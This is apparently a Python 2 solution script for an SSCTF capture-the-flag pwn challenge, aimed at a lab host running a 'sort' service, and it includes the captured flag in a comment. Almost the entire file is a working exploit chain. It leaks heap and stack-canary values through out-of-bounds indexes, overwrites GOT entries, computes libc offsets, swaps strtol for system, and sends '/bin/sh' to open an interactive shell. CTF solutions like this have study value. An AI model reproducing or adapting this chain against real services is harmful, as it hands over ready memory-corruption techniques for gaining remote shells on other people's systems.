#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.23"
#port = 8888
#SSCTF{eaf05181170412ab19d74ba3d5cf15b9}

host = "pwn.lab.seclover.com"
port = 22222

sock = make_conn(host,port)


strtol_got = 0x0804c01c
def initsort(sock,array,size=None):
    recvuntil(sock,"_CMD_$")
    sendline(sock,"sort")
    recvuntil(sock,":")
    if size :
        array.append("a")
        sendline(sock,str(size))
    else :
        sendline(sock,str(len(array)))
    for i in array :
        recvuntil(sock,":")
        sendline(sock,str(i))

def history(sock):
    recvuntil(sock,"_CMD_$")
    sendline(sock,"history")
    data = recvuntil(sock,"Data")
    return data

def clear(sock):
    recvuntil(sock,"_CMD_$")
    sendline(sock,"clear")

def update(sock,index,val):
    recvuntil(sock,"Choose:")
    sendline(sock,"2")
    recvuntil(sock,":")
    sendline(sock,str(index))
    recvuntil(sock,":")
    sendline(sock,str(val))

def reload(sock,index):
    recvuntil(sock,"_CMD_$")
    sendline(sock,"reload")
    recvuntil(sock,":")
    sendline(sock,str(index))

def sort(sock):
    recvuntil(sock,"Choose:")
    sendline(sock,"3")

def quit(sock):
    recvuntil(sock,"Choose:")
    sendline(sock,"7")


def query(sock,index):
    recvuntil(sock,"Choose:")
    sendline(sock,"1")
    recvuntil(sock,":")
    sendline(sock,str(index))
    data = recvuntil(sock,"Sort Menu:")
    return data




fuck = []



initsort(sock,[1,1,1,1,1,1,1,1])
sort(sock)


canaryaddr = 0x804c04c
data = query(sock,8)
heap = int(data.split()[-3].strip())
update(sock,8,canaryaddr)
quit(sock)
print hex(heap)

canary = int(history(sock).split()[-2][:-1].strip())
if canary > 0x7fffffff :
    canary -= 0x100000000
#libc = atoiaddr - 0x2d4f0
#libc = strtoladdr - 0x30240
memcpy_got = 0x804d020
print hex(canary)

for i in range(11):
    fuck.append(0x7fffffff)
for i in range(2):
    fuck.append(0x7fffffff^canary)
for i in range(19):
    fuck.append(0x7fffffff)


initsort(sock,fuck)
quit(sock)

initsort(sock,[1,1,1,1,1,1,1,1])
sort(sock)
update(sock,0,-1)
update(sock,8,heap+0x6c)
quit(sock)
reload(sock,1)
update(sock,16374,0x0804c000)
quit(sock)

printf = 0x80486c6
putchar = 0x80486d6
memset = 0x80486e6
startmain = 0x80486f6
getchr = 0x8048706
strtol = 0x8048716
memcpy = 0x8048726
strlen = 0x8048736


initsort(sock,[printf,putchar,memset,startmain,getchr,strtol,memcpy,strlen],20)

data = query(sock,5)
strtoladdr =  int(data.split()[-3])+0x100000000
#libc = strtoladdr - 0x30240
libc = strtoladdr - 0x305b0
print hex(libc)
#system = libc + 0x3b160
system = libc+0x3bc90
update(sock,5,system-0x100000000)
recvuntil(sock,"Choose:")
sendline(sock,"/bin/sh")
inter(sock)
